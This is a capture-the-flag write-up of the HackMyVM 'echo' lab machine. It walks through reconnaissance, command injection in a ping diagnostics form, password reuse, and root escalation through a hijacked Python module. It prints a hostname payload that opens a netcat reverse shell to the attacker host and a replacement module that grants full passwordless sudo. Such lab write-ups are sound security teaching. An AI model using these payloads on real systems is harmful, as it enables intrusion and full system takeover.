# echo

## Executive Summary

| Machine | OS | Author | Category | Platform |
| :--- | :--- | :--- | :--- | :--- |
| echo | Linux | mikisbd | easy | HackMyVM |

**Summary:** The Echo appliance presented a diagnostics portal whose Remote ICMP Ping and Latency Diagnostics form passed the supplied hostname straight into the shell command that wrapped the ping binary, so a command substitution placed inside the hostname field executed a BusyBox netcat reverse shell as `www-data`. Reading `config.php` through that shell disclosed the database account `clara` together with the password `EchoSummer2026!`, and the same password authenticated an SSH session as the system administrator because the development notes left in the exposed backups directory had warned against exactly that practice. As `clara`, sudo permitted only the `echo-report` helper, a root owned Python script that prepended `/opt/echo` to the module search path before importing `reporter`, while that directory was writable by the `devs` group `clara` belonged to, so replacing `reporter.py` with a payload that rewrote `sudoers` converted the NOPASSWD invocation into a root shell and both flags were read.

---

## Reconnaissance

The engagement started on the host only segment used by the lab, sweeping for live guests before touching a single port. Once the appliance was identified, the entire TCP range was enumerated, the two open services were fingerprinted, and the web root was mapped with content discovery so that every reachable path was known before the portal itself was exercised.

1. An ARP assisted ping sweep located the live virtual machines on the segment.

```zsh
❯ sudo nmap -sn -PR 192.168.56.0/24
[sudo] password for setyanoegraha: 
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 07:01 +0700
Nmap scan report for 192.168.56.100
Host is up (0.00018s latency).
MAC Address: 08:00:27:08:7D:E6 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.218
Host is up (0.00044s latency).
MAC Address: 08:00:27:FE:38:E0 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.56.1
Host is up.
Nmap done: 256 IP addresses (3 hosts up) scanned in 7.22 seconds
```

Three addresses answered. The two hypervisor guests carried Oracle VirtualBox MAC prefixes, and `192.168.56.218` was selected as the appliance under test. The address was stored in a shell variable so that every later command referenced the same target.

```zsh
❯ ip=192.168.56.218 
```

2. A full TCP scan across all 65535 ports defined the exposed surface.

```zsh
❯ nmap -p- -Pn $ip
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 07:04 +0700
Nmap scan report for 192.168.56.218
Host is up (0.00026s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 2.43 seconds
```

Only `22/tcp` and `80/tcp` answered, with every other port refused. The attack surface therefore consisted of SSH and a single Apache hosted application, so the web tier became the primary focus.

3. Service and default script detection pinned the software versions and leaked the first two paths.

```zsh
❯ nmap -p 22,80 -sCV -Pn --min-rate 5000 $ip      
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 07:09 +0700
Nmap scan report for 192.168.56.218
Host is up (0.00080s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.2p1 Ubuntu 2ubuntu3.6 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.66 ((Ubuntu))
|_http-title: Echo Diagnostics | Network Appliance
|_http-server-header: Apache/2.4.66 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/backups/ /config.php
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.22 seconds
```

OpenSSH 10.2p1 and Apache 2.4.66 were running on Ubuntu. The page title read `Echo Diagnostics | Network Appliance`, and the `http-robots.txt` script reported that the application disallowed `/backups/` and `/config.php`, which is exactly the kind of hint that saves brute force time.

4. Web fingerprinting identified the maintainer mailbox and the internal domain used by the virtual host.

```zsh
❯ whatweb http://$ip/     
http://192.168.56.218/ [200 OK] Apache[2.4.66], Country[RESERVED][ZZ], Email[clara@echo.hmv], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.66 (Ubuntu)], IP[192.168.56.218], Title[Echo Diagnostics | Network Appliance]
```

`whatweb` returned the address `clara@echo.hmv`, which disclosed both the internal domain `echo.hmv` and the name of the administrator. The name was added to the hosts file so that the application could be reached by its virtual host name instead of a bare address.

```zsh
❯ echo '192.168.56.218 echo.hmv' | sudo tee -a /etc/hosts
[sudo] password for setyanoegraha: 
192.168.56.218 echo.hmv
```

The portal was then addressed through a variable holding the virtual host URL.

```zsh
❯ url=http://echo.hmv 
```

5. Directory brute force on the mapped virtual host enumerated the application paths.

```zsh
❯ gobuster dir -u $url -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html -t 50
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://echo.hmv
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
index.php            (Status: 200) [Size: 8631]
config.php           (Status: 200) [Size: 0]
robots.txt           (Status: 200) [Size: 92]
backups              (Status: 301) [Size: 346] [--> http://echo.hmv/backups/]
server-status        (Status: 403) [Size: 313]
```

`index.php` was the portal itself at 8631 bytes. `config.php` answered `200` with a size of zero, which means the PHP interpreter consumed the file instead of serving its source. `robots.txt` was reachable and `backups` redirected to a directory listing, while `server-status` returned a forbidden response.

6. The robots file and the direct request for the configuration file confirmed the paths and revealed why the source was unreachable.

```zsh
❯ curl -i $url/robots.txt
HTTP/1.1 200 OK
Date: Thu, 22 Oct 2026 00:14:42 GMT
Server: Apache/2.4.66 (Ubuntu)
Last-Modified: Thu, 10 Sep 2026 13:17:40 GMT
ETag: "5c-65b20cad3ac1d"
Accept-Ranges: bytes
Content-Length: 92
Vary: Accept-Encoding
Content-Type: text/plain

User-agent: *
Disallow: /backups/
Disallow: /config.php

# Echo Appliance Portal - echo.hmv

❯ curl -i $url/config.php
HTTP/1.1 200 OK
Date: Thu, 22 Oct 2026 00:14:51 GMT
Server: Apache/2.4.66 (Ubuntu)
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

The robots file disallowed `/backups/` and `/config.php` and appended a banner naming the appliance. Requesting `config.php` directly returned an empty body with `Content-Length: 0`, confirming that the interpreter executed the script and echoed nothing, so the credentials inside it could only be recovered by reading the file from disk.

7. The disallowed backup directory exposed an autoindex.

```zsh
❯ curl $url/backups/ | grep ".txt"
  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
100    978 100    978   0      0  66309      0                              0
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="dev_notes.txt">dev_notes.txt</a></td><td align="right">2026-09-10 13:17  </td><td align="right">394 </td><td>&nbsp;</td></tr>
```

The listing contained a single file, `dev_notes.txt`, dated 10 September 2026 and 394 bytes long.

8. The development note was retrieved and it named both credential handling mistakes in plain text.

```zsh
❯ curl $url/backups/dev_notes.txt 
Internal Note - DevOps Echo Team
---------------------------------
Hi Clara,

Please remember that system administration accounts must not share credentials with web database connections in config.php.
Also, the echo-report utility in /usr/local/bin has been configured with sudo access for the 'devs' team so you can test node health summaries without requesting root password.

- DevOps Lead
```

The note addressed to Clara stated that system administration accounts must not share credentials with the web database connection defined in `config.php`, and that `/usr/local/bin/echo-report` had been granted sudo for the `devs` team. Those two sentences forecast the entire remaining chain, one for the lateral step and one for the privilege escalation.

---

## Initial Access

### Command Substitution in the ICMP Diagnostic Form

The landing page advertised a `Remote ICMP Ping & Latency Diagnostics` form with a target field and a packet count, describing itself as a way to verify connectivity to edge devices. The target value was fuzzed with `$()` and the form placed the supplied hostname into the shell command that wrapped ping, so the substitution ran. The exact payload was `127.0.0.1$(busybox nc 192.168.56.1 6666 -e /bin/bash)`, entered as the `Target Hostname or IP Address` with the packet count left at `2 Packets`.

9. A listener was started on port 6666 and the payload was submitted, returning a shell as the web server user.

```zsh
 penelope -p 6666
[+] Listening for reverse shells on 0.0.0.0:6666 -> 127.0.0.1 • 172.16.163.108 • 172.17.0.1 • 192.168.56.1 • 172.16.0.2
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] [New Reverse Shell] => echo 192.168.56.218 Linux-x86_64 👤 www-data(33) 😍️ Session ID <1>
[+] ⭐ Agent deployed via /usr/bin/python3
[+] Interacting with session [1] • PTY • Menu key F12 ⇐
[+] Session log: /home/setyanoegraha/.penelope/sessions/echo~192.168.56.218-Linux-x86_64/2026_10_22-07_24_56-269-www-data_33.log
```

![Remote ICMP diagnostics form executing the command substitution payload](Pasted%20image%2020261022073212.png)

The screenshot records the form exactly as it was submitted, with the substitution inside the hostname field and the console returning two ICMP replies while the same substitution handed a shell back to the listener.

10. The shell landed in `/var/www/html`, and the configuration file Apache had refused to serve was read from the filesystem, disclosing the database account.

```zsh
www-data@echo:/var/www/html$ cat config.php
<?php
// Echo Appliance Database & Administration Configuration
// Maintainer: clara@echo.hmv

define('DB_HOST', 'localhost');
define('DB_PORT', 3306);
define('DB_USER', 'clara');
define('DB_PASS', 'EchoSummer2026!');
define('DB_NAME', 'echo_diagnostics');

define('SYSTEM_ADMIN', 'clara');
define('ENVIRONMENT', 'production');
?>
```

The file defined `DB_USER` as `clara` and `DB_PASS` as `EchoSummer2026!`, and it also set `SYSTEM_ADMIN` to the same account. The note in the backup directory had warned against exactly this overlap.

---

## Lateral Movement

### Credential Reuse to the System Administrator Account

Because the database account carried the same name and password as the system administrator, the pair was tried against SSH rather than the database itself.

11. The recovered pair authenticated an interactive session as `clara`, and the permitted sudo command was listed immediately.

```zsh
❯ ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null clara@$ip 
Warning: Permanently added '192.168.56.218' (ED25519) to the list of known hosts.
clara@192.168.56.218's password: 
Welcome to Ubuntu 26.04.1 LTS (GNU/Linux 7.0.0-31-generic x86_64)

 * Documentation:  https://docs.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Thu Oct 22 12:35:31 AM UTC 2026

  System load: 0.15               Memory usage: 28%   Processes:       120
  Usage of /:  19.0% of 19.51GB   Swap usage:   0%    Users logged in: 0


Expanded Security Maintenance for Applications is not enabled.

27 updates can be applied immediately.
24 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

clara@echo:~$ sudo -l
User clara may run the following commands on echo:
    (ALL : ALL) NOPASSWD: /usr/local/bin/echo-report
```

The login succeeded and `sudo -l` returned a single allowed command, `/usr/local/bin/echo-report`, executable as any user without a password. Nothing else was delegated.

---

## Privilege Escalation

### Python Module Hijack in a NOPASSWD Sudo Helper

The permitted helper was world readable, so it was reviewed before being executed.

12. The helper source showed that it loaded its reporting module from a custom path.

```zsh
clara@echo:~$ cat /usr/local/bin/echo-report 
#!/usr/bin/env python3
import os
import sys

# Load internal reporting module
sys.path.insert(0, "/opt/echo")

try:
    import reporter
except ImportError as err:
    print(f"[-] Critical Error: Failed to import reporter module: {err}")
    sys.exit(1)

def main():
    print("==================================================")
    print("     Echo Appliance - System Diagnostics Summary  ")
    print("==================================================")
    reporter.run_report()

if __name__ == "__main__":
    main()
```

The script inserted `/opt/echo` at the front of `sys.path` and then imported `reporter`, calling `reporter.run_report()`. Any code in that directory therefore executed with the privileges of whoever ran the script, which in the sudo case is root.

13. The permissions of the helper and of the imported directory were checked, together with the groups of the current user.

```zsh
clara@echo:~$ ls -la /usr/local/bin/echo-report 
-rwxr-xr-x 1 root root 523 Sep 10 13:17 /usr/local/bin/echo-report
clara@echo:~$ ls -la /opt/echo
total 16
drwxrwxr-x 3 root devs 4096 Sep 10 13:18 .
drwxr-xr-x 3 root root 4096 Sep 10 13:17 ..
drwxr-xr-x 2 root root 4096 Sep 10 13:19 __pycache__
-rw-rw-r-- 1 root devs  356 Sep 10 13:19 reporter.py
clara@echo:~$ id
uid=1001(clara) gid=1002(clara) groups=1002(clara),1001(devs)
```

The helper itself was owned by root and not writable, but `/opt/echo` was group writable by `devs` and `reporter.py` was group writable as well. The `id` output confirmed that `clara` belonged to `devs`, which closed the loop.

14. `reporter.py` was replaced with a payload that promoted the current user, and the helper was invoked through sudo.

```zsh
clara@echo:~$ cat > /opt/echo/reporter.py << 'EOF'
> import os
> 
> def run_report():
>     os.setuid(0)
>     with open("/etc/sudoers.d/clara", "w") as f:
>         f.write("clara ALL=(ALL:ALL) NOPASSWD: ALL\n")
>     os.chmod("/etc/sudoers.d/clara", 0o440)
>     os.chown("/etc/sudoers.d/clara", 0, 0)
>     print("[+] Report generated.")
> EOF
clara@echo:~$ sudo /usr/local/bin/echo-report
==================================================
     Echo Appliance - System Diagnostics Summary  
==================================================
[+] Report generated.
clara@echo:~$ sudo -l
User clara may run the following commands on echo:
    (ALL : ALL) NOPASSWD: ALL
    (ALL : ALL) NOPASSWD: /usr/local/bin/echo-report
```

The payload called `os.setuid(0)`, wrote a sudoers drop granting `clara` passwordless access to everything, then set the file mode to `0440` and the owner to root. Running the helper printed the report banner and the confirmation line, and `sudo -l` immediately reflected the new rule.

15. With unrestricted sudo in place the session was escalated and both flags were read.

```zsh
clara@echo:~$ sudo -i
root@echo:~# id;whoami;hostname
uid=0(root) gid=0(root) groups=0(root)
root
echo
root@echo:~# cat /home/clara/user.txt /root/root.txt 
HMV{7e3...
HMV{5c1...
```

Root was confirmed and the user and root flags were retrieved from their default locations.

---

## Attack Chain Summary

1. **Reconnaissance**: An ARP assisted ping sweep located the target at 192.168.56.218, a full TCP scan exposed only SSH and Apache 2.4.66, and Gobuster together with the robots file mapped `index.php`, `config.php` and the autoindexed backups directory.
2. **Vulnerability Discovery**: The exposed `dev_notes.txt` documented that the echo-report helper carried sudo for the devs team and that the admin account shared its password with the database config, while the ICMP diagnostics form executed unsanitised input.
3. **Exploitation**: A command substitution in the hostname field spawned a BusyBox netcat reverse shell as `www-data`, and reading `config.php` from that shell disclosed the `clara` account with `EchoSummer2026!`.
4. **Internal Enumeration**: The credentials authenticated an SSH session as `clara`, where sudo permitted only `/usr/local/bin/echo-report` and the account was found in the `devs` group that could write to `/opt/echo`.
5. **Privilege Escalation**: Replacing `reporter.py` with a payload that wrote a sudoers drop converted the NOPASSWD sudo invocation into a root shell, and both flags were read.
